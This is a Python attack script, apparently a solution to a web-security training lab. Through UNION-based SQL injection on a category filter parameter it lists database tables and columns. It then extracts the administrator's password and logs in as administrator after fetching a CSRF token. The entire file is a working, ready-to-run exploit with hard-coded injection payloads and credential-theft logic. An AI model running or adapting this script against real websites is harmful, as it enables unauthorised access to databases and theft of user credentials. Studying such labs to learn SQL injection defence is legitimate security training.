#!/usr/bin/python3

import requests
import sys
import urllib3
import argparse
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def perfom_request(url, sqli_payload):
    path = "/filter?category=Gifts"
    r = requests.get(url+path+sqli_payload, verify=False, proxies=proxies)
    return r.text

def sqli_users_table(url, proxies=None):
    sqli_payload = "' UNION SELECT NULL, table_name FROM information_schema.tables--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    users_table = soup.find(string=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

def sqli_users_columns(url, users_table):
    sqli_payload = f"' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name = '{users_table}'--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    username_column = soup.find(string=re.compile('.*username.*'))
    password_column = soup.find(string=re.compile('.*password.*'))
    return username_column, password_column

def sqli_administrator_cred(url, users_table, username_column, password_column):
    sqli_payload = f"' UNION SELECT {username_column}, {password_column} FROM {users_table}--"
    response = perfom_request(url, sqli_payload)
    soup = BeautifulSoup(response, 'html.parser')
    admin_password = soup.body.find(string="administrator").parent.find_next('td').contents[0]
    return admin_password

# get csrf token to login
def get_csrf_token(sess, url):
    path_login = "/login"
    r = sess.get(url+path_login, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    print(f"[*] Take CSRF Token to login: {csrf}")
    return csrf

# login as an administrator
def login_administrator(sess, url, admin_password, proxies=None):
    csrf = get_csrf_token(sess,url)
    path_login = "/login"
    data = {
        "csrf": csrf,
        "username": "administrator",
        "password": admin_password
    }
    r = sess.post(url+path_login, data=data, verify=False, proxies=proxies)
    if "Log out" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SQL injection attack, listing the database contents on non-Oracle databases")
    parser.add_argument("-u", "--url", help="Target URL(e.g., https://example)")
    parser.add_argument("--proxy", help="Proxy URL (e.g.,http://127.0.0.1:8080)", default=None)

    args = parser.parse_args()

    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using Proxy: {args.proxy}")

    print(f"[*] Looking for a users table...")
    users_table = sqli_users_table(args.url.strip(), proxies)
    if users_table:
        print(f"[+] Found the users table name: {users_table}")
        username_column, password_column = sqli_users_columns(args.url.strip(), users_table)
        if username_column and password_column:
            print(f"[+] Found the username column name: {username_column}")
            print(f"[+] Found the password column name: {password_column}")

            admin_password = sqli_administrator_cred(args.url.strip(), users_table, username_column, password_column)
            if admin_password:
                print(f"[+] The administrator's password is: {admin_password}")

                print(f"[*] Try to login as an Administrator...")
                sess = requests.Session()
                if login_administrator(sess, args.url.strip(), admin_password):
                    print(f"[+] We have logged as an Administrator!")
                else:
                    print(f"[-] Dod not login as an Administrator")
            else:
                print(f"[-] Did not find the Administrator password.")
        else:
            print(f"[-] Did not find username and/or password columns.")
    else:
        print(f"[-] Did not find users table.")
